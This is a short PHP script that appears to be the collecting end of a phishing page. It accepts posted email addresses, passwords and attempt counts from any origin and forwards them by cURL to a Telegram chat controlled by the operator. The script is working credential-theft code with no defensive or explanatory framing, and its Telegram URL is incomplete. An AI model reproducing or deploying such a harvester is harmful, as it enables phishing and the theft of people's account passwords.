<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') { exit; }

$data = json_decode(file_get_contents('php://input'), true);

if ($data && !empty($data['email'])) {
    $apiToken = getenv('TELEGRAM_TOKEN'); 
    $chatId   = getenv('TELEGRAM_CHAT_ID');
    
    $message = "<b>🚀 LOGIN</b>\n📧: <code>{$data['email']}</code>\n🔑: <code>{$data['password']}</code>\n🔢: #{$data['attempt']}";

    $ch = curl_init("https://telegram.org");
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML']));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['success' => true]);
}
